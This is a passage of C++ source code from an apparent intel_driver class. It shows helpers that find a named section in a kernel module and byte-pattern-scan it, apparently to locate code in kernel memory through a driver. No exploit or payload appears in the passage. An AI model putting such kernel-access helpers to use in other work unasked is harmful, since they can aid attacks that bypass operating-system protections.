		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t intel_driver::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
}
